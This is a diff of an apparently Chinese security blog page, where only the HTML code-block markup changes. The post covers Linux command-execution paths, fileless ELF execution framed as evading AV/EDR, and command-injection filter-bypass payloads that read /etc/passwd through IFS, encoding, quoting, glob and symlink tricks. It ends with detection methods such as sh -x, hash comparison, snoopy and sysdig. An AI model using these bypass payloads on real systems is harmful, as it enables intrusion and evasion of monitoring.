@@ -255,70 +255,20 @@
 
 <span id="more"></span>
 
-<h2 id="0x01-指令执行方式"><a href="#0x01-指令执行方式" class="headerlink" title="0x01 指令执行方式"></a>0x01 指令执行方式</h2><h3 id="1-通过glibc-api执行系统指令"><a href="#1-通过glibc-api执行系统指令" class="headerlink" title="1. 通过glibc api执行系统指令"></a>1. 通过glibc api执行系统指令</h3><pre><code>1) system() glibc api
+<h2 id="0x01-指令执行方式"><a href="#0x01-指令执行方式" class="headerlink" title="0x01 指令执行方式"></a>0x01 指令执行方式</h2><h3 id="1-通过glibc-api执行系统指令"><a href="#1-通过glibc-api执行系统指令" class="headerlink" title="1. 通过glibc api执行系统指令"></a>1. 通过glibc api执行系统指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1) system() glibc api</span><br><span class="line"></span><br><span class="line">system是linux系统提供的函数调用之一，glibc也提供了对应的封装api</span><br><span class="line"></span><br><span class="line">2) exec系列 glibc api</span><br><span class="line"></span><br><span class="line">exec系列函数由一组相关的函数组成，它们在进程的启动方式和程序参数的声明上各有不同，但exec系列函数都有一个共同的工作方式，就是把当前进程替换为一个新进程</span><br><span class="line"></span><br><span class="line">3) fork() glibc api</span><br></pre></td></tr></table></figure>
 
-system是linux系统提供的函数调用之一，glibc也提供了对应的封装api
-
-2) exec系列 glibc api
-
-exec系列函数由一组相关的函数组成，它们在进程的启动方式和程序参数的声明上各有不同，但exec系列函数都有一个共同的工作方式，就是把当前进程替换为一个新进程
-
-3) fork() glibc api
-</code></pre>
 <h3 id="2-通过syscall系统调用执行指令"><a href="#2-通过syscall系统调用执行指令" class="headerlink" title="2. 通过syscall系统调用执行指令"></a>2. 通过syscall系统调用执行指令</h3><p>除了通过glibc调用fork&#x2F;execv之外，还可以绕过glibc，直接通过汇编触发“int80中断”，从而直接使用操作系统提供的系统调用能力</p>
-<pre><code>1) system syscall
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) system syscall</span><br><span class="line"></span><br><span class="line">2) execve syscall</span><br></pre></td></tr></table></figure>
 
-2) execve syscall
-</code></pre>
-<h3 id="3-通过Bash执行指令"><a href="#3-通过Bash执行指令" class="headerlink" title="3. 通过Bash执行指令"></a>3. 通过Bash执行指令</h3><pre><code>1) Bash内置指令执行
+<h3 id="3-通过Bash执行指令"><a href="#3-通过Bash执行指令" class="headerlink" title="3. 通过Bash执行指令"></a>3. 通过Bash执行指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Bash内置指令执行</span><br><span class="line"></span><br><span class="line">Shell 内建命令，就是由 Bash 自身提供的命令，而不是文件系统中的某个可执行文件；内建指令不会启动新进程，可以用type指令来查看某个指令是否是Bash内建指令</span><br><span class="line"></span><br><span class="line">2) 通过Bash启动第三方新进程（指令）</span><br><span class="line"></span><br><span class="line">本质上Bash通过调用execve() glibc api来实现</span><br></pre></td></tr></table></figure>
 
-Shell 内建命令，就是由 Bash 自身提供的命令，而不是文件系统中的某个可执行文件；内建指令不会启动新进程，可以用type指令来查看某个指令是否是Bash内建指令
+<h3 id="4-Python执行命令"><a href="#4-Python执行命令" class="headerlink" title="4. Python执行命令"></a>4. Python执行命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1) os.execv()</span><br><span class="line"></span><br><span class="line">python底层调用了glibc库的execv api来实现进程启动</span><br><span class="line"></span><br><span class="line">2) python Multiprocessing类</span><br><span class="line"></span><br><span class="line">Unix/Linux下，multiprocessing模块封装了fork()调用，创建出多进程后，每个新进程都拷贝了一份原主进程的完整py代码，新的多进程可以继续执行py代码中指定的callback函数</span><br><span class="line"></span><br><span class="line">   a. Process（用于创建进程模块）：通过python Process类启动的新进程，只会监控到fork事件</span><br><span class="line">   b. Pool（用于创建管理进程池）：通过python Pool类启动的新进程，底层还是调用的fork</span><br><span class="line"></span><br><span class="line">3) 执行中间态缓存文件</span><br><span class="line"></span><br><span class="line">python会在执行.py文件的时候，将.py形式的程序编译成中间式文件（byte-compiled）的.pyc文件，可以提前先编译好pyc文件，之后投递到目标机器上直接执行，从而躲避目标机器上IDS的文本内容审查</span><br></pre></td></tr></table></figure>
 
-2) 通过Bash启动第三方新进程（指令）
-
-本质上Bash通过调用execve() glibc api来实现
-</code></pre>
-<h3 id="4-Python执行命令"><a href="#4-Python执行命令" class="headerlink" title="4. Python执行命令"></a>4. Python执行命令</h3><pre><code>1) os.execv()
-
-python底层调用了glibc库的execv api来实现进程启动
-
-2) python Multiprocessing类
-
-Unix/Linux下，multiprocessing模块封装了fork()调用，创建出多进程后，每个新进程都拷贝了一份原主进程的完整py代码，新的多进程可以继续执行py代码中指定的callback函数
-
-   a. Process（用于创建进程模块）：通过python Process类启动的新进程，只会监控到fork事件
-   b. Pool（用于创建管理进程池）：通过python Pool类启动的新进程，底层还是调用的fork
-
-3) 执行中间态缓存文件
-
-python会在执行.py文件的时候，将.py形式的程序编译成中间式文件（byte-compiled）的.pyc文件，可以提前先编译好pyc文件，之后投递到目标机器上直接执行，从而躲避目标机器上IDS的文本内容审查
-</code></pre>
 <h3 id="5-无文件进程启动方式"><a href="#5-无文件进程启动方式" class="headerlink" title="5. 无文件进程启动方式"></a>5. 无文件进程启动方式</h3><p>进程启动的本质是将一段汇编指令（shellcode）从某种媒介上加载到计算机的内存（RAM）中，并触发操作系统的cpu调度，从某个执行的内存地址中开始按照逻辑顺序执行。</p>
 <p>操作系统真正需要的是内存中的shellcode代码以及制定入口点虚拟内存空间，至于这个shellcode从哪里来并不重要，可以是从物理磁盘，也可以是网络IO流，或者是虚拟内存设备。</p>
 <p>在Linux系统中实现无文件执行ELF是渗透测试中一种非常有用的技术。这种方法较为隐蔽，可以绕过各种类型的反病毒保护机制、系统完整性保护机制以及基于硬盘监控的防护系统。通过这种方法，我们能够以最小的动静访问目标。</p>
-<pre><code>1) 基于linux内存镜像文件 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1) 基于linux内存镜像文件 </span><br><span class="line"></span><br><span class="line">可以利用linux文件系统中的共享内存分区来存储进程文件，如</span><br><span class="line"></span><br><span class="line">/dev/shm</span><br><span class="line">/run/shm</span><br><span class="line"></span><br><span class="line">这些目录实际上是挂载到文件系统上已分配的内存空间，写入到这些目录下的文件不会实际落到物理磁盘上</span><br><span class="line"></span><br><span class="line">但使用ls命令可查看这些目录和目录下的进程文件</span><br><span class="line"></span><br><span class="line">2) 基于memfd_create创建内存镜像文件 </span><br><span class="line"></span><br><span class="line">memfd_create这个系统调用。该系统调用与malloc比较类似，但并不会返回指向已分配内存的一个指针，而是返回指向某个匿名文件的文件描述符。该匿名文件以链接（link）形式存放在/proc/pid/fd/文件系统中</span><br><span class="line"></span><br><span class="line">   a. 将可执行文件载入内存并启动【C语言】：在本地编译并执行一个二进制程序投递载荷，容易被二进制AV/EDR检测与防御阻断</span><br><span class="line"></span><br><span class="line">   使用行为特征更隐蔽的脚本语言，例如perl/python/powershell，这类语言本身都预装在操作系统中，而且可以在命令行即时执行而不需要落盘文件</span><br><span class="line"></span><br><span class="line">   b. 使用perl进行memfd_create无文件执行：创建内存匿名文件 -&gt; 将ELF内容写入内存匿名文件 -&gt; 调用exec函数执行匿名内存文件</span><br><span class="line"></span><br><span class="line">   c. 使用python进行memfd_create无文件执行：使用memfd_create()系统调用来创建匿名文件 -&gt; 使用可执行ELF文件填充该文件 -&gt; 执行该文件，也可以使用fork()多次执行该文件</span><br></pre></td></tr></table></figure>
 
-可以利用linux文件系统中的共享内存分区来存储进程文件，如
-
-/dev/shm
-/run/shm
-
-这些目录实际上是挂载到文件系统上已分配的内存空间，写入到这些目录下的文件不会实际落到物理磁盘上
-
-但使用ls命令可查看这些目录和目录下的进程文件
-
-2) 基于memfd_create创建内存镜像文件 
-
-memfd_create这个系统调用。该系统调用与malloc比较类似，但并不会返回指向已分配内存的一个指针，而是返回指向某个匿名文件的文件描述符。该匿名文件以链接（link）形式存放在/proc/pid/fd/文件系统中
-
-   a. 将可执行文件载入内存并启动【C语言】：在本地编译并执行一个二进制程序投递载荷，容易被二进制AV/EDR检测与防御阻断
-
-   使用行为特征更隐蔽的脚本语言，例如perl/python/powershell，这类语言本身都预装在操作系统中，而且可以在命令行即时执行而不需要落盘文件
-
-   b. 使用perl进行memfd_create无文件执行：创建内存匿名文件 -&gt; 将ELF内容写入内存匿名文件 -&gt; 调用exec函数执行匿名内存文件
-
-   c. 使用python进行memfd_create无文件执行：使用memfd_create()系统调用来创建匿名文件 -&gt; 使用可执行ELF文件填充该文件 -&gt; 执行该文件，也可以使用fork()多次执行该文件
-</code></pre>
 <h2 id="0x02-绕过姿势"><a href="#0x02-绕过姿势" class="headerlink" title="0x02 绕过姿势"></a>0x02 绕过姿势</h2><h3 id="1-通配符注入"><a href="#1-通配符注入" class="headerlink" title="1. 通配符注入"></a>1. 通配符注入</h3><p>glob 模式（globbing）也被称之为 shell 通配符，shell 通配符 &#x2F; glob 模式通常用来匹配目录以及文件，而非文本</p>
 <table>
 <thead>
@@ -380,135 +330,45 @@ memfd_create这个系统调用。该系统调用与malloc比较类似，但并�
 <blockquote>
 <p>|重导向标准输出<br>&lt;|重导向标准输入<br>||命令管线<br>&amp;|重导向文件描述符，或将命令静默执行<br>( )|将其内的命令置于 nested subshell 执行，或用于运算或命令替换<br><code>&#123; &#125;</code>|将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围<br>;|在前一个命令结束时，而忽略其返回值，继续执行下一个命令<br>&amp;&amp;|在前一个命令结束时，若返回值为 true，继续执行下一个命令<br><code>||</code>|在前一个命令结束时，若返回值为 false，继续执行下一个命令<br>!|执行 history 中的命令</p>
 </blockquote>
-<h3 id="2-命令注入姿势"><a href="#2-命令注入姿势" class="headerlink" title="2. 命令注入姿势"></a>2. 命令注入姿势</h3><h4 id="a-无空格绕过"><a href="#a-无空格绕过" class="headerlink" title="a. 无空格绕过"></a>a. 无空格绕过</h4><pre><code>cat&lt;/etc/passwd
+<h3 id="2-命令注入姿势"><a href="#2-命令注入姿势" class="headerlink" title="2. 命令注入姿势"></a>2. 命令注入姿势</h3><h4 id="a-无空格绕过"><a href="#a-无空格绕过" class="headerlink" title="a. 无空格绕过"></a>a. 无空格绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;/etc/passwd</span><br><span class="line"></span><br><span class="line">&#123;cat,/etc/passwd&#125;</span><br><span class="line"></span><br><span class="line">cat$IFS/etc/passwd</span><br><span class="line"></span><br><span class="line">echo$&#123;IFS&#125;&quot;RCE&quot;$&#123;IFS&#125;&amp;&amp;cat$&#123;IFS&#125;/etc/passwd</span><br><span class="line"></span><br><span class="line">IFS=,;`cat&lt;&lt;&lt;uname,-a`</span><br><span class="line"></span><br><span class="line">;ls%09-al%09/home</span><br></pre></td></tr></table></figure>
 
-&#123;cat,/etc/passwd&#125;
+<h4 id="b-回车绕过"><a href="#b-回车绕过" class="headerlink" title="b. 回车绕过"></a>b. 回车绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ something%0Acat%20/etc/passwd</span><br><span class="line"></span><br><span class="line">;cat&gt;/tmp/hi&lt;&lt;EOF%0ahello%0aEOF</span><br><span class="line">;cat&lt;/tmp/hi</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>
 
-cat$IFS/etc/passwd
+<h4 id="c-编码绕过"><a href="#c-编码绕过" class="headerlink" title="c. 编码绕过"></a>c. 编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">$ cat `echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ abc=$&#x27;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#x27;;cat $abc</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ `echo $&#x27;cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#x27;`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">$ cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ xxd -r -ps &lt;(echo 2f6574632f706173737764)</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">$ cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
 
-echo$&#123;IFS&#125;&quot;RCE&quot;$&#123;IFS&#125;&amp;&amp;cat$&#123;IFS&#125;/etc/passwd
-
-IFS=,;`cat&lt;&lt;&lt;uname,-a`
-
-;ls%09-al%09/home
-</code></pre>
-<h4 id="b-回车绕过"><a href="#b-回车绕过" class="headerlink" title="b. 回车绕过"></a>b. 回车绕过</h4><pre><code>$ something%0Acat%20/etc/passwd
-
-;cat&gt;/tmp/hi&lt;&lt;EOF%0ahello%0aEOF
-;cat&lt;/tmp/hi
-hello
-</code></pre>
-<h4 id="c-编码绕过"><a href="#c-编码绕过" class="headerlink" title="c. 编码绕过"></a>c. 编码绕过</h4><pre><code>$ echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;
-/etc/passwd
-
-$ cat `echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;`
-root:x:0:0:root:/root:/bin/bash
-
-$ abc=$&#39;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#39;;cat $abc
-root:x:0:0:root:/root:/bin/bash
-
-$ `echo $&#39;cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#39;`
-root:x:0:0:root:/root:/bin/bash
-
-$ xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764
-/etc/passwd
-
-$ cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`
-root:x:0:0:root:/root:/bin/bash
-
-$ xxd -r -ps &lt;(echo 2f6574632f706173737764)
-/etc/passwd
-
-$ cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`
-root:x:0:0:root:/root:/bin/bash
-</code></pre>
 <h4 id="d-绕错字符过滤"><a href="#d-绕错字符过滤" class="headerlink" title="d. 绕错字符过滤"></a>d. 绕错字符过滤</h4><p>没有反斜杠和斜杠的命令执行</p>
-<pre><code>$ echo $&#123;HOME:0:1&#125;
-/
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ echo $&#123;HOME:0:1&#125;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ cat $&#123;HOME:0:1&#125;etc$&#123;HOME:0:1&#125;passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">$ echo . | tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27; &lt;&lt;&lt; .</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ cat $(echo . | tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27;)etc$(echo . | tr &#x27;!-0&#x27; &#x27;&quot;-1&#x27;)passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
 
-$ cat $&#123;HOME:0:1&#125;etc$&#123;HOME:0:1&#125;passwd
-root:x:0:0:root:/root:/bin/bash
+<h4 id="e-绕过黑名单单词"><a href="#e-绕过黑名单单词" class="headerlink" title="e. 绕过黑名单单词"></a>e. 绕过黑名单单词</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">w&#x27;h&#x27;o&#x27;am&#x27;i     # 使用单引号</span><br><span class="line"></span><br><span class="line">w&quot;h&quot;o&quot;am&quot;i     # 使用双引号</span><br><span class="line"></span><br><span class="line">w\ho\am\i      # 用反斜杠和斜杠绕过</span><br><span class="line">/\b\i\n/////s\h</span><br><span class="line"></span><br><span class="line">who$@ami       # 使用$@绕过</span><br><span class="line"></span><br><span class="line">echo $0</span><br><span class="line">-&gt; /usr/bin/zsh</span><br><span class="line">echo whoami|$0</span><br><span class="line"></span><br><span class="line">who$()ami      # 使用$()绕过</span><br><span class="line">who$(echo am)i</span><br><span class="line">who`echo am`i</span><br><span class="line"></span><br><span class="line">/???/??t /???/p??s??  # 使用变量扩展绕过</span><br><span class="line"></span><br><span class="line">test=/ehhh/hmtc/pahhh/hmsswd</span><br><span class="line">cat $&#123;test//hhh\/hm/&#125;</span><br><span class="line">cat $&#123;test//hh??hm/&#125;</span><br></pre></td></tr></table></figure>
 
-$ echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;
-/
-
-$ tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .
-/
-
-$ cat $(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)etc$(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)passwd
-root:x:0:0:root:/root:/bin/bash
-</code></pre>
-<h4 id="e-绕过黑名单单词"><a href="#e-绕过黑名单单词" class="headerlink" title="e. 绕过黑名单单词"></a>e. 绕过黑名单单词</h4><pre><code>w&#39;h&#39;o&#39;am&#39;i     # 使用单引号
-
-w&quot;h&quot;o&quot;am&quot;i     # 使用双引号
-
-w\ho\am\i      # 用反斜杠和斜杠绕过
-/\b\i\n/////s\h
-
-who$@ami       # 使用$@绕过
-
-echo $0
--&gt; /usr/bin/zsh
-echo whoami|$0
-
-who$()ami      # 使用$()绕过
-who$(echo am)i
-who`echo am`i
-
-/???/??t /???/p??s??  # 使用变量扩展绕过
-
-test=/ehhh/hmtc/pahhh/hmsswd
-cat $&#123;test//hhh\/hm/&#125;
-cat $&#123;test//hh??hm/&#125;
-</code></pre>
 <h3 id="3-execve绕过"><a href="#3-execve绕过" class="headerlink" title="3. execve绕过"></a>3. execve绕过</h3><p>绕过execve监控的关键点在于创建软链接，通过创建软链接的方式来混淆命令执行的路径</p>
-<pre><code>$ ln -s /usr/bin/ps /tmp/pstest
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ln -s /usr/bin/ps /tmp/pstest</span><br><span class="line"></span><br><span class="line">$ strace -f /tmp/pstest</span><br><span class="line">execve(&quot;/tmp/pstest&quot;, [&quot;/tmp/pstest&quot;], 0x7fff831e0168 /* 26 vars */) = 0</span><br></pre></td></tr></table></figure>
 
-$ strace -f /tmp/pstest
-execve(&quot;/tmp/pstest&quot;, [&quot;/tmp/pstest&quot;], 0x7fff831e0168 /* 26 vars */) = 0
-</code></pre>
 <p>由于execve执行软链接，会自动执行目标文件，不会对软链接进行转换，从而实现隐藏</p>
 <p>为避免执行ln命令暴露命令路径，可批量创建软连接</p>
-<pre><code>cp -s /usr/bin/* /tmp/
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -s /usr/bin/* /tmp/</span><br></pre></td></tr></table></figure>
+
 <h2 id="0x03-检测方法"><a href="#0x03-检测方法" class="headerlink" title="0x03 检测方法"></a>0x03 检测方法</h2><h3 id="1-bash调试功能"><a href="#1-bash调试功能" class="headerlink" title="1. bash调试功能"></a>1. bash调试功能</h3><p>利用bash调试功能检测命令注入，检测基于shell元字符的绕过方式，还原原始命令</p>
 <p>sh是bash的软连接，本质上还是调用的bash。sh -x可以打印出shell脚本的运行过程，这样就可以看到真正的执行命令；使用sh -x作为沙箱，提取带+号的内容，即可还原命令</p>
 <h3 id="2-文件哈希对比"><a href="#2-文件哈希对比" class="headerlink" title="2. 文件哈希对比"></a>2. 文件哈希对比</h3><p>针对软链接、命令替换等方式可利用文件哈希库对比检测</p>
-<pre><code>1) 文件哈希一致，但二进制文件名不同：检测软链接/命令复制重命名
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) 文件哈希一致，但二进制文件名不同：检测软链接/命令复制重命名</span><br><span class="line"></span><br><span class="line">2) 二进制文件名相同，但文件哈希不一致：检测命令替换为恶意文件</span><br></pre></td></tr></table></figure>
 
-2) 二进制文件名相同，但文件哈希不一致：检测命令替换为恶意文件
-</code></pre>
 <h3 id="3-命令执行监控"><a href="#3-命令执行监控" class="headerlink" title="3. 命令执行监控"></a>3. 命令执行监控</h3><h4 id="a-定制-bash-记录方式"><a href="#a-定制-bash-记录方式" class="headerlink" title="a. 定制 bash 记录方式"></a>a. 定制 bash 记录方式</h4><p>定制 bash 方式本质上是为 bash 源程序增加审计日志的功能, 可以据此添加一些操作命令的上下文信息, 但很难记录子进程的信息</p>
 <p><strong>缺点</strong></p>
-<pre><code>1. 容易被绕过, 用户可以使用 csh, zsh 等;
-2. 无法记录 shell 脚本内的操作;
-3. 过滤规则相对单一;
-4. 需要不停的更新 bash 版本, 维护成本高, 否则容易被发行版替换;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 容易被绕过, 用户可以使用 csh, zsh 等;</span><br><span class="line">2. 无法记录 shell 脚本内的操作;</span><br><span class="line">3. 过滤规则相对单一;</span><br><span class="line">4. 需要不停的更新 bash 版本, 维护成本高, 否则容易被发行版替换;</span><br></pre></td></tr></table></figure>
+
 <h4 id="b-snoopy-记录方式"><a href="#b-snoopy-记录方式" class="headerlink" title="b. snoopy 记录方式"></a>b. snoopy 记录方式</h4><p>snoopy 方式本质上是封装了 execv, execve 系统调用, 以系统预加载(preload)的方式实现记录所有的命令操作。目前大部分系统执行命令时都通过 execv, execve 系统调用执行, 这点和会话无关, 几乎所有的情况下, 只要通过这两个系统调用执行命令, 会将操作行为记录下来</p>
 <p><strong>优点</strong></p>
-<pre><code>1. 难以绕过, 只要设置了 PRELOAD, 就肯定会记录;
-2. 无论是否存在 tty 会话, 都会记录 execv, execve 相关的命令行操作, 包含详细的进程上下文信息;
-3. 可以记录 shell 脚本内部的操作行为, 脚本内的命令行操作大部分都会调用 execv, execve;
-4. 可以记录操作行为的参数, 比如指定了用户名, 密码等;
-5. 过滤规则丰富, 可以忽略指定 daemon, uid, 也可以仅记录指定的 uid;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 难以绕过, 只要设置了 PRELOAD, 就肯定会记录;</span><br><span class="line">2. 无论是否存在 tty 会话, 都会记录 execv, execve 相关的命令行操作, 包含详细的进程上下文信息;</span><br><span class="line">3. 可以记录 shell 脚本内部的操作行为, 脚本内的命令行操作大部分都会调用 execv, execve;</span><br><span class="line">4. 可以记录操作行为的参数, 比如指定了用户名, 密码等;</span><br><span class="line">5. 过滤规则丰富, 可以忽略指定 daemon, uid, 也可以仅记录指定的 uid;</span><br></pre></td></tr></table></figure>
+
 <p><strong>缺点</strong></p>
-<pre><code>1. 仅支持 execv, execve 相关系统调用的操作;
-2. 不设置规则会产生的日志过多, 对日志搜集系统造成很大的负担;
-3. 暂不支持过滤敏感信息规则;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 仅支持 execv, execve 相关系统调用的操作;</span><br><span class="line">2. 不设置规则会产生的日志过多, 对日志搜集系统造成很大的负担;</span><br><span class="line">3. 暂不支持过滤敏感信息规则;</span><br></pre></td></tr></table></figure>
+
 <p><strong>过滤规则</strong></p>
 <p>snoopy 记录方式能够详细的记录所有的命令操作信息，实际使用过程，可以通过过滤规则来避免产生过多的信息</p>
 <p>过滤规则在 <code>(filtering.c - snoopy_filtering_check_chain)</code> 函数实现, 由 <code>log.c - snoopy_log_syscall_exec</code> 函数调用, 过滤规则为事后行为, 即在打印日志的时候判断是否满足过滤规则, 并非事前行为</p>
-<pre><code>1) 忽略 crond, my-daemon 守护进程, 忽略 nagios 用户
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 忽略 crond, my-daemon 守护进程, 忽略 nagios 用户</span><br><span class="line"></span><br><span class="line">filter_chain = exclude_uid:996;exclude_spawns_of:crond,my-daemon   </span><br><span class="line"></span><br><span class="line">2) 通过exclude_comm 过滤规则, 忽略以 mysql, mongo 和 redis-cli 工具执行的命令</span><br><span class="line"></span><br><span class="line">filter_chain = exclude_uid:992;exclude_comm:mysql,mongo,redis-cli</span><br></pre></td></tr></table></figure>
 
-filter_chain = exclude_uid:996;exclude_spawns_of:crond,my-daemon   
-
-2) 通过exclude_comm 过滤规则, 忽略以 mysql, mongo 和 redis-cli 工具执行的命令
-
-filter_chain = exclude_uid:992;exclude_comm:mysql,mongo,redis-cli
-</code></pre>
 <h4 id="c-sysdig-记录方式"><a href="#c-sysdig-记录方式" class="headerlink" title="c. sysdig 记录方式"></a>c. sysdig 记录方式</h4><p>可以通过 strace 工具来简单追踪进程的行为，strace 程序是基于 ptrace 系统调用实现的, ptrace 为了能够获取到其他系统调用的详细信息, 需要做很多复杂的操作, 如果进程很繁忙, strace 就会对程序产生较大影响，不建议对线上程序使用</p>
 <p>sysdig 以内核模块的方式监控获取所有的系统调用, 其使用方式类似 libpcap&#x2F;tcpdump 的用法, 可以将一段时间内系统调用的数据暂存起来供以后的跟踪分析。对于 系统调用 而言, 用户态层面的操作最终都会陷入到内核态, 由内核去完成对应的功能。所以 sysdig 在内核态也就能很方便的获取到进程的上下文信息；另外 sysdig 以非阻塞(non-blocking), 零拷贝(zero-copy) 的方式获取数据, 所以在实际使用中对在线的业务只有很轻微的影响。</p>
